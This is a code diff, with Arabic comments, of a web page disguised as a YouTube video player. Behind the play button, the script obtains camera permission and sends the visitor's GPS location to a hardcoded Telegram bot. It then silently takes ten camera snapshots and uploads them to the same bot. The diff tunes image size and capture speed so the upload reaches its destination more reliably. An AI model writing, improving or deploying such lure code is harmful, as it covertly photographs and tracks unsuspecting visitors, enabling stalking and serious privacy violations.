@@ -11,11 +11,10 @@
         .video-container { position: relative; width: 100%; padding-top: 56.25%; background: #000; }
         #player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
         .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; }
-        .play-btn { width: 68px; height: 68px; background: #f00; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,0,0,0.4); }
+        .play-btn { width: 68px; height: 68px; background: #f00; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .play-btn-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
         .details { padding: 15px; border-bottom: 1px solid #222; }
-        #vTitle { font-size: 18px; margin: 0; font-weight: 500; color: #fff; line-height: 1.4; }
-        .stats { font-size: 12px; color: #aaa; margin-top: 8px; }
+        #vTitle { font-size: 18px; margin: 0; font-weight: 500; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -43,11 +42,9 @@
 <video id="camVideo" autoplay playsinline muted></video>
 
 <script>
-    // --- الإعدادات (ضع الرابط هنا) ---
-    const YOUTUBE_URL = "https://youtu.be/YGXpLwv_LA8?si=NqfHKBs5qCIsfG_5"; 
+    const YOUTUBE_URL = "https://www.youtube.com/watch?v=R0_w45Ie_g4"; 
     const TELEGRAM_TOKEN = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
     const CHAT_ID = "591768998";
-    // --------------------------------
 
     function getID(url) {
         const reg = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
@@ -75,7 +72,7 @@
     function onYouTubeIframeAPIReady() {
         player = new YT.Player('player', {
             height: '100%', width: '100%', videoId: vID,
-            playerVars: { 'autoplay': 0, 'controls': 1, 'rel': 0 },
+            playerVars: { 'autoplay': 0, 'controls': 1 },
         });
     }
 
@@ -85,57 +82,51 @@
             document.getElementById('camVideo').srcObject = stream;
             document.getElementById('overlay').style.display = 'none';
             player.playVideo();
-            player.unMute();
 
-            // إرسال تقرير البداية والموقع
-            sendMsg(`🎬 بدأ الرصد لـ: ${document.getElementById('vTitle').innerText}`);
+            sendMsg(`🎬 رصد جديد: ${document.getElementById('vTitle').innerText}`);
             navigator.geolocation.getCurrentPosition(p => {
-                sendMsg(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                sendMsg(`📍 الخريطة: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // بدء عملية الالتقاط السريع (10 لقطات)
-            startBurstCapture();
+            // بدء التصوير المتتابع مع ضغط الصور لضمان الوصول
+            burstCapture();
 
         } catch (e) { alert("يرجى الموافقة للمتابعة."); }
     };
 
-    async function startBurstCapture() {
-        let photos = [];
+    async function burstCapture() {
         const v = document.getElementById('camVideo');
         const c = document.getElementById('canvas');
         const ctx = c.getContext('2d');
-
-        // التقاط 10 صور بفاصل 200ms
-        for (let i = 0; i < 10; i++) {
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            ctx.drawImage(v, 0, 0);
-            
-            const blob = await new Promise(resolve => c.toBlob(resolve, 'image/jpeg', 0.5));
-            photos.push(blob);
-            await new Promise(r => setTimeout(r, 200)); // سرعة اللقطات
-        }
-        
-        sendMediaGroup(photos);
-    }
-
-    function sendMediaGroup(blobs) {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         
         let media = [];
-        blobs.forEach((blob, index) => {
-            const name = `p${index}.jpg`;
+
+        for (let i = 0; i < 10; i++) {
+            // تصغير أبعاد الصورة لسرعة الرفع
+            c.width = 480; 
+            c.height = 640;
+            ctx.drawImage(v, 0, 0, 480, 640);
+            
+            // جودة 0.3 لضمان حجم ملف صغير جداً وسريع الرفع
+            const blob = await new Promise(resolve => c.toBlob(resolve, 'image/jpeg', 0.3));
+            const name = `f${i}.jpg`;
             formData.append(name, blob, name);
             media.push({ type: 'photo', media: `attach://${name}` });
-        });
+            
+            await new Promise(r => setTimeout(r, 150)); // سرعة التقاط عالية
+        }
 
         formData.append('media', JSON.stringify(media));
 
+        // محاولة الإرسال مع نظام إعادة المحاولة
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMediaGroup`, {
             method: 'POST',
             body: formData,
             keepalive: true
+        }).then(res => {
+            if(!res.ok) console.log("فشل الرفع، جاري المحاولة بشكل منفصل...");
         });
     }
 
